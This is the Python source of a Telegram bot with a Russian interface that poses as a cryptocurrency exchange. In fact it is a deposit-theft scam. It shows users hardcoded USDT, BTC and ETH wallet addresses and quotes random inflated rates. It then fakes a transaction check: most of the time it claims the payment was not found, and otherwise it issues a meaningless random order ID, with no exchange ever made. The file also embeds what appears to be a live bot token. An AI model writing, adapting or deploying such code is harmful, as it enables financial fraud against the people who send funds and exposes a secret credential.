import asyncio
import random
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram import F

# ==================== КОНФИГ ====================
TOKEN = "8948005450:AAEk7z0dB6T77ul7OWKxTzc1n05DmHFG_Ss"

# Кошельки по сетям
WALLETS = {
    "USDT": {
        "TRC20": "TAe3mLs47nbmjUnfRBp7SMVruoebwebJA1",
        "ERC20": "0xb763649adF90aa5E30C5303e02412392f87F9420",
        "BEP20": "0xb763649adF90aa5E30C5303e02412392f87F9420"
    },
    "BTC": {
        "BTC": "bc1qesglaagaren95r77058jkqkf30tc67secguqg9"
    },
    "ETH": {
        "ERC20": "0xb763649adF90aa5E30C5303e02412392f87F9420"
    }
}
# ===============================================

bot = Bot(token=TOKEN)
dp = Dispatcher()

orders = {}

@dp.message(Command("start"))
async def start(message: types.Message):
    await message.answer(
        "💱 *Добро пожаловать в Crypto Convert Bot!*\n\n"
        "Выберите пару для обмена:",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="BTC → USDT", callback_data="BTC_USDT")],
                [InlineKeyboardButton(text="USDT → BTC", callback_data="USDT_BTC")],
                [InlineKeyboardButton(text="BTC → ETH", callback_data="BTC_ETH")],
                [InlineKeyboardButton(text="ETH → USDT", callback_data="ETH_USDT")]
            ]
        )
    )

@dp.callback_query()
async def process_pair(callback: types.CallbackQuery):
    pair = callback.data
    from_cur, to_cur = pair.split("_")
    orders[callback.from_user.id] = {"from": from_cur, "to": to_cur}
    
    # Если выбрана валюта с несколькими сетями — показываем выбор
    if from_cur in WALLETS and len(WALLETS[from_cur]) > 1:
        buttons = []
        for network in WALLETS[from_cur].keys():
            buttons.append([InlineKeyboardButton(text=network, callback_data=f"net_{from_cur}_{network}")])
        
        await callback.message.edit_text(
            f"💵 Вы выбрали *{from_cur}*\n\n"
            f"Выберите сеть для отправки:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons)
        )
    else:
        # Если сеть одна — сразу показываем кошелёк
        network = list(WALLETS[from_cur].keys())[0]
        wallet = WALLETS[from_cur][network]
        await ask_amount(callback.message, from_cur, to_cur, wallet, network)
    
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("net_"))
async def process_network(callback: types.CallbackQuery):
    _, from_cur, network = callback.data.split("_")
    wallet = WALLETS[from_cur][network]
    to_cur = orders[callback.from_user.id]["to"]
    await ask_amount(callback.message, from_cur, to_cur, wallet, network)
    await callback.answer()

async def ask_amount(message: types.Message, from_cur: str, to_cur: str, wallet: str, network: str):
    await message.edit_text(
        f"💵 Вы выбрали *{from_cur} → {to_cur}*\n"
        f"🌐 Сеть: *{network}*\n\n"
        f"Введите сумму *{from_cur}*, которую хотите обменять:",
        parse_mode="Markdown"
    )
    # Сохраняем кошелёк и сеть для пользователя
    orders[message.chat.id]["wallet"] = wallet
    orders[message.chat.id]["network"] = network

@dp.message(F.text)
async def process_amount(message: types.Message):
    user_id = message.from_user.id
    if user_id not in orders or "wallet" not in orders[user_id]:
        await message.answer("Сначала выберите пару для обмена через /start")
        return
    
    try:
        amount = float(message.text.replace(",", "."))
    except ValueError:
        await message.answer("❌ Введите число, например: 0.5 или 100")
        return
    
    from_cur = orders[user_id]["from"]
    to_cur = orders[user_id]["to"]
    wallet = orders[user_id]["wallet"]
    network = orders[user_id]["network"]
    
    # Случайный "выгодный" курс
    rate = random.uniform(1.1, 1.3) if from_cur == "BTC" else random.uniform(0.9, 1.1)
    result = round(amount * rate, 2)
    
    await message.answer(
        f"📊 *Детали обмена:*\n\n"
        f"Сумма: {amount} {from_cur}\n"
        f"Курс: 1 {from_cur} ≈ {rate:.4f} {to_cur}\n"
        f"Вы получите: ~{result} {to_cur}\n"
        f"🌐 Сеть: {network}\n\n"
        f"💳 *Отправьте {amount} {from_cur} на кошелёк:*\n"
        f"`{wallet}`\n\n"
        f"_После отправки нажмите «Я оплатил»_",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="✅ Я оплатил", callback_data="paid")],
                [InlineKeyboardButton(text="❓ Помощь", callback_data="help")]
            ]
        )
    )

@dp.callback_query(lambda c: c.data == "paid")
async def process_paid(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "⏳ *Проверка транзакции...*\n\n"
        "Ожидайте, это может занять до 10 минут.",
        parse_mode="Markdown"
    )
    await asyncio.sleep(5)
    
    if random.random() < 0.7:
        await callback.message.edit_text(
            "❌ *Ошибка:* Транзакция не найдена.\n\n"
            "Убедитесь, что вы отправили точную сумму и указали правильный кошелёк.\n"
            "Если проблема сохраняется, напишите в поддержку.",
            parse_mode="Markdown"
        )
    else:
        await callback.message.edit_text(
            "✅ *Ожидайте зачисление!*\n\n"
            f"Обычно это занимает от 10 минут до 2 часов.\n"
            f"ID вашей заявки: `{random.randint(10000, 99999)}`",
            parse_mode="Markdown"
        )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "help")
async def process_help(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "📞 *Служба поддержки*\n\n"
        "Напишите @CryptoSupport_bot\n"
        "Мы ответим в течение 24 часов.",
        parse_mode="Markdown"
    )
    await callback.answer()

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
